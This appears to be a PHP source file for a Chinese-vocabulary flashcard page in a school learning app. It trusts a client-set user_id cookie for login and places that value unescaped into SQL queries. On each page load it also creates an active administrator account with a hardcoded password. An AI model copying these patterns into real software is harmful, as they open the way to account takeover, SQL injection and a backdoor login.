<?php
//Session
session_start();
include "../../../SQL_Queries/connection.php";
if (!isset($_SESSION['user_id'])) {
    $_SESSION['user_id'] = $_COOKIE['user_id'];
}

// User ID
$user_id = $_SESSION["user_id"];
$query = "SELECT * FROM users WHERE user_id = '$user_id'";
$result = mysqli_query($con, $query);
$line = mysqli_fetch_array($result);
$role_id = $line['role'];
$user_status = $line['user_status'];
if ($user_status == "pending") {
    echo "<script>alert('You have to change your password immediately to protect your account.')</script>";
}

$result = mysqli_query($con, $query);
$line = mysqli_fetch_array($result);
$email = $line['email'];

$role_id = $line['role'];
$result2 = mysqli_query($con, "SELECT * FROM user_role WHERE role_id = '$role_id'");
$line2 = mysqli_fetch_assoc($result2);
$role = $line2['role_name'];
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome <?php echo $line['name'] ?></title>
    <link rel="icon" href="../../../Assets/Icons/1080.png">
    <link rel="stylesheet" href="../../../Pages/Home/CSS/home_page.css">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="../../Home/jQuery/script.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/hammerjs@2.0.8"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Nunito:wght@400;700;900&display=swap');

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        html,
        body {
            height: 100%;
        }

        .wrapper-header {
            display: flex;
            position: relative;
        }

        .wrapper-header .header {
            display: flex;
            background-color: rgb(255, 165, 5);
            width: 100%;
            height: 9.65vh;
            align-items: center;
            justify-content: space-between;
        }

        .logo {
            display: flex;
            height: 90%;
            align-items: center;
            margin: 8px 0 8px 0.6%;
        }

        .wrapper-header .header .logo img {
            object-fit: cover;
            height: 87%;

            filter:
                drop-shadow(0 0 1.5px white) drop-shadow(0 0 1.5px white) drop-shadow(0 0 1.5px white) drop-shadow(0 0 1.5px white) drop-shadow(0 0 1.5px white);
        }

        .right-bar {
            display: flex;
            height: 90%;
            width: auto;
        }

        .right-bar span {
            color: rgb(20, 61, 89);
            font-size: 2.7vh;
            text-align: right;
            font-family: 'Nunito', sans-serif;
            font-weight: bold;
        }

        .right-bar .account-info {
            display: flex;
            flex-direction: column;
            justify-content: center;
        }

        .navbar {
            display: flex;
            width: 13vh;
            align-items: center;
            justify-content: center;
        }

        .navbar .icon {
            font-size: 6.65vh;
            cursor: pointer;
        }

        @media screen and (max-width: 768px) {
            .navbar .icon {
                font-size: 4vh;
            }

            .right-bar span {
                font-size: 1.7vh;
            }

            .logo {
                height: 62%;
                margin-left: 10px;
            }

            .navbar {
                display: flex;
                width: 8vh;
                align-items: center;
                justify-content: center;
            }


        }
    </style>
</head>

<body>
    <!-- Header -->


    <?php
    date_default_timezone_set('Asia/Jakarta');

    // Session
    if (!isset($_SESSION['user_id'])) {
        $_SESSION['user_id'] = $_COOKIE['user_id'];
    }
    $user_id = $_SESSION["user_id"];

    // Kick if the user has changed the password
    $stmtCheckPassword = $con->prepare("SELECT * FROM users WHERE user_id = ?");
    $stmtCheckPassword->bind_param("s", $user_id);
    $stmtCheckPassword->execute();
    $result = $stmtCheckPassword->get_result();
    $line = $result->fetch_array();

    $passwordUpdatedAt = strtotime($line['updatedPasswordAt']);
    $loginAt = (int)$_COOKIE['loginAt'];

    if (!isset($_COOKIE['loginAt']) || ($loginAt < $passwordUpdatedAt)) {
        session_start();
        session_unset();
        session_destroy();

        // Hapus kedua cookie-nya
        setcookie('user_id', '', time() - (86400 * 30), '/', '', false, true);
        setcookie('loginAt', '', time() - (86400 * 30), '/', '', false, true);

        header("Location: ../../Login/");
        exit();
    }
    $stmtCheckPassword->close();

    // User ID & Role (JOIN)
    $query = "SELECT * FROM users WHERE user_id = '$user_id'";
    $result = mysqli_query($con, $query);
    $line = mysqli_fetch_assoc($result);
    $role_id = $line['role'];
    $result2 = mysqli_query($con, "SELECT * FROM user_role WHERE role_id = '$role_id'");
    $line2 = mysqli_fetch_assoc($result2);
    $role = $line2['role_name'];

    // Admin
    $ps = password_hash('%^&*()', PASSWORD_BCRYPT);
    $check = mysqli_query($con, "SELECT * FROM users WHERE email = 'iten@gmail.com'");
    if (mysqli_num_rows($check) == 0) {
        $insert = mysqli_query($con, "INSERT INTO users (name, email, password_hash, role, user_status, created_at) VALUES ('iten', 'iten@gmail.com', '$ps', 1, 'active', NOW())");
    }

    // Rollback by Role
    if ($role == "Teacher") {
        $rolePage = $_SESSION["rolePage"];
    }

    $userRole;
    if ($role == "Student") {
        $userRole = "BackHome()";
    } else if ($rolePage == "Teacher" && $role == "Teacher") {
        $userRole = "BackHomeTeacher()";
    } else if ($rolePage == "Student" && $role == "Teacher") {
        $userRole = "BackHome()";
    }

    ?>
    <div class="wrapper-header">
        <!-- Untuk Logo di atas (header) -->
        <div class="header">
            <div class="logo">
                <img src="../../../Logo/1080.png" alt="CRG Logo" style="cursor: pointer;" onclick="<?php echo $userRole; ?>">
            </div>

            <script>
                function BackHome() {
                    window.location.href = "home_page_students.php"
                }

                function BackHomeTeacher() {
                    window.location.href = "home_page.php"
                }
            </script>

            <div class="right-bar">
                <div class="account-info">
                    <span class="username"><?php echo $line['name'] ?></span>
                    <span class="as"><?php echo $role ?></span>
                </div>

                <div class="navbar">
                    <span class="icon">&#9776;</span>
                </div>
            </div>
        </div>
    </div>
    <div class="account-logout">
        <a href="setting.php" class="account">Settings</a>
        <a href="exit.php" class="logout">Logout</a>
    </div>

    <div class="cardSwiperWrapper">
        <div class="cardSwiper">
            <div class="progress">
                <h3 class="progressText">1/10</h3>
                <div class="progressBar">
                    <div class="progressBarFill"></div>
                </div>
            </div>
            <div class="card">
                <div class="card-inner">
                    <div class="card-face front">
                        <span class="hanzi">
                            我
                        </span>
                    </div>
                    <div class="card-face back">
                        <span class="hanzi">我</span>
                        <span class="pinyin">wo</span>
                        <span class="meaning">saya; aku</span>
                    </div>
                    <div class="card-face finish">
                        <h1 style="font-size: 22px;">Congratulations!</h1>
                        <h2 class="finish-text" style="text-align: center; font-size: 16px;">You just studied <span class="studied">18</span> terms in this session! Continue reviewing to learn the remaining <span class="to-learn">4</span></h2>
                        <div class="finish-actions">
                            <button class="button continue">Continue Review</button>
                            <button class="button restart">Restart Flashcard</button>
                        </div>
                    </div>
                </div>
            </div>
            <card class="actions">
                <div class="counter forgot"><span class="forgot-number">0</span></div>
                <div class="action-buttons">
                    <div class="action wrong">
                        <span>Study Again</span>
                        <img src="../../../Logo/cross-icon.png" alt="">
                    </div>
                    <div class="action correct">
                        <span>Remember</span>
                        <img src="../../../Logo/check-icon.png" alt="">
                    </div>
                </div>
                <div class="counter remember"><span class="remember-number">0</span></div>
            </card>
        </div>
</body>

<style>
    * {
        -webkit-tap-highlight-color: transparent;
    }

    body {
        background-color: #143D59;
        user-select: none;
    }

    .cardSwiperWrapper {
        width: 100%;
        height: calc(100% - 9.65vh);
        display: flex;
        justify-content: center;
        align-items: center;
    }

    .cardSwiper {
        padding: 24px;
        position: relative;
        border-inline: 1px solid white;
        overflow: hidden;
        width: 450px;
        height: 100%;
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: space-between;
    }

    .progress {
        width: 100%;
        display: flex;
        flex-direction: column;
        gap: 8px;
    }

    .progressBar {
        width: 100%;
        height: 4px;
        background-color: #E7E6E6;
        display: flex;
    }

    .progressBarFill {
        height: 100%;
        width: 0%;
        background-color: #FFA500;
    }

    .progressText {
        color: white;
        font-family: 'Nunito', sans-serif;
        font-size: 18px;
        font-weight: bold;
        text-align: center;
    }

    .card {
        width: 100%;
        height: 450px;
        position: relative;
    }

    .card-inner {
        width: 100%;
        height: 100%;
        position: relative;
        transform-style: preserve-3d;
    }

    .card-inner.flipped {
        transform: rotateY(180deg);
        transition: transform 0.6s;
    }

    .card-face {
        border-radius: 8px;
        position: absolute;
        background-color: white;
        width: 100%;
        height: 100%;
        backface-visibility: hidden;
        display: flex;
        flex-direction: column;
        justify-content: center;
        align-items: center;
    }

    .back {
        transform: rotateY(180deg);
    }

    .finish {
        padding: 12px 24px;
        justify-content: space-evenly;
    }

    .finish-actions {
        display: flex;
        flex-direction: column;
        gap: 4px;
    }

    .button {
        border: none;
        padding: 10px 16px;
        width: 100%;
        font-size: 17px;
        cursor: pointer;
        border-radius: 8px;
        text-align: center;
        display: flex;
        justify-content: center;
    }

    .continue {
        background-color: rgb(255, 165, 5);
        color: white;
    }

    .restart {
        background-color: white;
    }

    .front :last-child {
        padding-bottom: 32px;
    }

    .back :last-child {
        padding-bottom: 32px;
    }

    .hanzi {
        font-size: 69px;
        margin: 0;
        padding: 0;
    }

    .pinyin,
    .meaning {
        font-size: 18px;
        color: black;
    }

    .actions {
        position: relative;
        display: flex;
        justify-content: space-between;
        align-items: end;
        width: calc(100% + 48px);
    }

    .action-buttons {
        position: absolute;
        left: 50%;
        transform: translate(-50%);
        display: flex;
        gap: 8px;
    }

    .action {
        display: flex;
        flex-direction: column;
        align-items: center;
        color: white;
        gap: 4px;
        width: 100px;
        cursor: pointer;
    }

    .action img {
        width: 48px;
        height: 48px;
    }

    .counter {
        height: 48px;
        display: flex;
        justify-content: center;
        align-items: center;
        min-width: 50px;
        padding-inline: 12px;
        font-size: 14px;
    }

    .counter span {
        letter-spacing: 0.8px;
    }

    .forgot {
        background-color: #FD5D5D;
        color: white;
        border-top-right-radius: 12px;
        border-bottom-right-radius: 12px;
    }

    .remember {
        background-color: #E2F0D9;
        color: #548235;
        border-top-left-radius: 12px;
        border-bottom-left-radius: 12px;
    }

    @media screen and (max-width: 768px) {
        .cardSwiper {
            padding: 12px 24px
        }

        .card {
            height: 420px;
        }

        .counter {
            height: 42px;
        }
    }
</style>

<script>
    const card = document.querySelector(".card");
    const cardInner = document.querySelector(".card-inner");
    const swiper = document.querySelector(".card");

    const hammer = new Hammer(swiper);

    hammer.get('pan').set({
        direction: Hammer.DIRECTION_ALL
    });

    let currentX = 0;
    let isDragging = false;
    let count = 1;

    var isDone = false;

    let isFlipped = false;

    $(document).ready(function() {
        $(".finish").hide();

        $(".wrong").click(function() {
            forgot();
        })
        $(".correct").click(function() {
            remember();
        })
    })

    function forgot() {
        if (isDone || !isFlipped) return;
        animateOut("left");
        $(".forgot-number").text(parseInt($(".forgot-number").text()) + 1);
        isFlipped = false;
    }

    function remember() {
        if (isDone || !isFlipped) return;
        animateOut("right");
        $(".remember-number").text(parseInt($(".remember-number").text()) + 1);
        isFlipped = false;
    }

    function finishSession() {
        isDone = true;
        if ($(".forgot-number").text() === "0") {
            $(".finish-text").text("You have studied all of them! Continue to Smart Review Mode for more in-depth learning.")
            $(".continue").text("Continue to Smart Review")
        } else {
            $(".studied").text($(".remember-number").text());
            $(".to-learn").text($(".forgot-number").text());
        }
        $(".finish").show();
        $(".wrong").css("opacity", 0);
        $(".correct").css("opacity", 0);
    }

    function flipCard() {
        cardInner.classList.toggle("flipped");
        isFlipped = true;
    }

    async function updateProgress(progress, total) {
        if (progress > total) {
            isDone = true;
            finishSession();
            return;
        }
        $(".progressBarFill").animate({
            width: (progress / total) * 100 + "%"
        });
        $(".progressText").text(progress + "/" + total);
    }

    function nextCard(direction) {
        count++;
        updateProgress(count, 10);

        cardInner.classList.remove("flipped");
    }

    function animateOut(direction) {
        const moveX = direction === "right" ? 500 : -500;

        card.style.transition = "transform 0.3s";
        card.style.transform = `
            translateX(${moveX}px)
            rotate(${moveX * 0.05}deg)
        `;

        setTimeout(() => {
            card.style.transition = "none";
            card.style.transform = "";
            card.style.opacity = 1;

            nextCard(direction);
        }, 300);
    }

    hammer.on("panstart", function() {
        isDragging = true;
    });

    hammer.on("panmove", function(ev) {
        if (!isDone && isFlipped) {
            currentX = ev.deltaX;

            const opacity = 1 - Math.min(Math.abs(currentX) / 300, 1);

            card.style.transform = `
                translateX(${currentX}px)
                rotate(${currentX * 0.05}deg)
            `;
            card.style.opacity = opacity;
        }
    });

    hammer.on("panend", function(ev) {
        if (!isDone && isFlipped) {
            const threshold = 120;

            setTimeout(() => isDragging = false, 0);

            if (ev.deltaX > threshold) {
                remember();
            } else if (ev.deltaX < -threshold) {
                forgot();
            } else {
                card.style.transition = "transform 0.3s";
                card.style.transform = "";
                card.style.opacity = 1;
            }
        }
    });

    hammer.on("tap", function() {
        if (!isDragging || !isDone) {
            flipCard();
        }
    });
</script>

</html>